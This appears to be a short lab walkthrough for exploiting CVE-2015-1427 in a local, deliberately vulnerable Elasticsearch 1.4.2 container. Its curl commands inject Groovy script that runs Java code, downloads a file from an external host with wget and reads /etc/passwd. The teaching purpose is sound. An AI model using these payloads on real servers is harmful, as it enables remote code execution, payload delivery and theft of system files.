# Context

The scenario uses an older version of Elasticsearch which was vulnerable to a remote exploit and detailed in CVE-2015-1427.

# Instructions

Create the container.

```
docker run -d -p 9200:9200 --name es benhall/elasticsearch:1.4.2
```

With data inserted, we can now exploit the database. An empty instance is not vulnerable to the problem.

```
curl -XPUT 'http://localhost:9200/twitter/user/kimchy1' -d '{ "name" : "Shay Banon" }'
```

In this case we're using Java to get access to the Operating System name.

```
curl http://localhost:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.System\").getProperty(\"os.name\")"}}}'
```

This command makes external HTTP requests to download additional files. HTTPBin echos the results on the HTTP request, but this could be additional applications to launch additional attacks.

Once the process has been started, we can read the file off disk.

```
curl http://localhost:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"wget -O /tmp/testy http://httpbin.org/get\")"}}}'
```

We can also read potentially sensitive files such as a passwd.

```
curl http://localhost:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getText()"}}}'
```
